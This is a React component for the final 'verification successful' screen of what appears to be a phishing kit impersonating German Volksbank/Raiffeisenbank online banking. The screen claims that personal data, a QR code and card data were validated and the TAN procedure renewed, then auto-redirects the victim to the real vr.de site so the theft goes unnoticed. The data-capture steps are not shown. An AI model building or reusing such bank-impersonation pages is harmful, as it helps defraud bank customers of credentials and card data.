import React, { useEffect, useState } from 'react';
import { CheckCircle, Shield, ArrowRight } from 'lucide-react';

const FinalSuccessScreen: React.FC = () => {
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);
  const [countdown, setCountdown] = useState(10);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    // Countdown timer
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          window.location.href = 'https://www.vr.de/privatkunden.html';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://www.vr.de/privatkunden.html';
  };

  // Responsive styles
  const containerPadding = isSmallMobile ? '20px 20px 20px 20px' : isMobile ? '24px 24px 24px 24px' : '32px 8px 32px 8px';
  const cardWidth = isMobile ? '100%' : '660px';
  const cardPadding = isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px';
  const titleFontSize = isSmallMobile ? '1.5rem' : isMobile ? '1.75rem' : '2.375rem';
  const titleLineHeight = isSmallMobile ? '1.75rem' : isMobile ? '2rem' : '2.75rem';

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: containerPadding,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'flex-start'
      }}>
        <div style={{
          width: '100%',
          maxWidth: cardWidth,
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'visible'
        }}>
          <div style={{
            padding: cardPadding,
            textAlign: 'center'
          }}>
            
            {/* Success Icon */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              marginBottom: '32px'
            }}>
              <div style={{
                backgroundColor: '#28a745',
                borderRadius: '50%',
                width: isMobile ? '80px' : '100px',
                height: isMobile ? '80px' : '100px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                boxShadow: '0 4px 16px rgba(40, 167, 69, 0.3)'
              }}>
                <CheckCircle size={isMobile ? 40 : 50} color="white" />
              </div>
            </div>

            <h1 style={{
              color: '#003d7a',
              fontSize: titleFontSize,
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: titleLineHeight,
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Verifizierung erfolgreich
            </h1>
            
            <p style={{
              margin: '0 0 32px 0',
              fontSize: isMobile ? '16px' : '18px',
              lineHeight: isMobile ? '24px' : '28px',
              color: '#000',
              fontFamily: 'VB-Regular, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Ihre Identität wurde erfolgreich verifiziert. Das TAN-Verfahren wurde erneuert.
            </p>

            {/* Success Details */}
            <div style={{
              backgroundColor: '#d4edda',
              border: '1px solid #c3e6cb',
              borderRadius: '8px',
              padding: '24px',
              marginBottom: '32px',
              textAlign: 'left'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                marginBottom: '16px'
              }}>
                <Shield size={24} color="#155724" />
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: 'normal',
                  color: '#155724',
                  margin: '0',
                  fontFamily: 'VB-Bold, Arial, sans-serif',
                  fontStyle: 'normal'
                }}>
                  Verifizierung abgeschlossen
                </h3>
              </div>
              
              <ul style={{
                fontSize: '14px',
                color: '#155724',
                lineHeight: '20px',
                margin: 0,
                paddingLeft: '20px',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                <li style={{ marginBottom: '6px' }}>✓ Persönliche Daten bestätigt</li>
                <li style={{ marginBottom: '6px' }}>✓ QR-Code verifiziert</li>
                <li style={{ marginBottom: '6px' }}>✓ Kartendaten validiert</li>
                <li style={{ marginBottom: '0' }}>✓ TAN-Verfahren erfolgreich erneuert</li>
              </ul>
            </div>

            {/* Redirect Info */}
            <div style={{
              backgroundColor: '#e8f4fd',
              border: '1px solid #b8d4e3',
              borderRadius: '8px',
              padding: '20px',
              marginBottom: '32px'
            }}>
              <p style={{
                fontSize: '14px',
                color: '#003d7a',
                margin: '0 0 12px 0',
                lineHeight: '20px',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Sie werden in {countdown} Sekunden automatisch weitergeleitet.
              </p>
              <p style={{
                fontSize: '14px',
                color: '#333333',
                margin: '0',
                lineHeight: '20px',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Sie können nun wieder sicher auf Ihr Online-Banking zugreifen.
              </p>
            </div>

            {/* Manual Redirect Button */}
            <button
              onClick={handleManualRedirect}
              style={{
                backgroundColor: '#0066b3',
                color: 'white',
                border: 'none',
                borderRadius: '50px',
                padding: isMobile ? '16px 32px' : '18px 48px',
                fontSize: isMobile ? '16px' : '18px',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal',
                fontWeight: 'normal',
                cursor: 'pointer',
                transition: 'background-color 0.2s ease',
                width: '100%',
                textAlign: 'center',
                display: 'inline-block',
                lineHeight: '1.5'
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = '#0052a3';
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = '#0066b3';
              }}
            >
              Zum Online-Banking
            </button>

            {/* Additional Info */}
            <div style={{
              marginTop: '32px',
              textAlign: 'center'
            }}>
              <p style={{
                fontSize: '12px',
                color: '#6c757d',
                margin: '0',
                lineHeight: '16px',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Bei Fragen wenden Sie sich an Ihre örtliche Volksbank oder Raiffeisenbank.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FinalSuccessScreen;